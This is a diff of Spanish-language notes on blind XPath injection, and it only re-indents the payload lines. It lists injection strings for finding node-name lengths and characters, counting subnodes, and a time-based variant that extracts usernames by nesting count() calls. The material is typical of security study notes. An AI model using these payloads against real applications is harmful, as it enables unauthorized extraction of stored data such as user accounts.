@@ -15,24 +15,24 @@ Funciona con el mismo criterio de las BLIND SQLI.
 
 #### Extraer el length de un nodo
 
-  invalid'+or+string-length(name(/*[1]))=1+and+'1'='1
+    invalid'+or+string-length(name(/*[1]))=1+and+'1'='1
   
 #### Extraer caracteres de un nodo
 
-  invalid'+or+substring(name(/*[1]),<index_del_nombre>,1)='a'+and+'1'='1
+    invalid'+or+substring(name(/*[1]),<index_del_nombre>,1)='a'+and+'1'='1
 
 #### Extraer cantidad de subnodos 
 
 Una vez que tenemos el nombre de un nodo tenemos podemos extraer la cantidad de subnodos:
 
-  invalid'+or+count(/<nodo>/*)=2+and+'1'='1
+    invalid'+or+count(/<nodo>/*)=2+and+'1'='1
 
 
 #### Extrayendo el nombre de un subnodo:
 
 Una vez que sabemos la cantidad de subnodos y tenemos el nodo principal podemos empezar a realizar los pasos anteriormente agregando el index del subnodo: [1]
 
-  invalid+or+substring(name(/<nodo>/*[1]),1,1)='a'+and+'1'='1
+    invalid+or+substring(name(/<nodo>/*[1]),1,1)='a'+and+'1'='1
   
 ---
 
@@ -42,5 +42,5 @@ En los casos donde la respuesta no pueda darnos un indicio de funcionamiento, au
 
 Para esto usaremos de manera recursiva la función COUNT haciendo que se itere el documento reiteradas veces.
 
-  invalid'+or+substring(/users/user[1]/username,1,1)='a'+and+count((//.)[count((//.))])+and+'1'='1
+    invalid'+or+substring(/users/user[1]/username,1,1)='a'+and+count((//.)[count((//.))])+and+'1'='1
 
